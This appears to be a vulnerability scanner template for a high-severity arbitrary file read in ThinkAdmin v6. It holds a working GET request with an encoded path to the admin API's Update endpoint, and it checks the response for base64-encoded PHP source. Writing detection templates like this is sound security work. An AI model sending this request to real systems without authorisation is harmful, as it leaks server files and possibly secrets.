expression: r0()
id: thinkadmin-v6-readfile
info:
  author: 0x_zmz(github.com/0x-zmz)
  name: Thinkadmin v6 readfile
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("json") &&
      response.body.bcontains(bytes("PD9waH")) && response.body.bcontains(bytes("VGhpbmtBZG1pbg"))
    request:
      follow_redirects: true
      method: GET
      path: /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b2x322s2t3c1a342w34
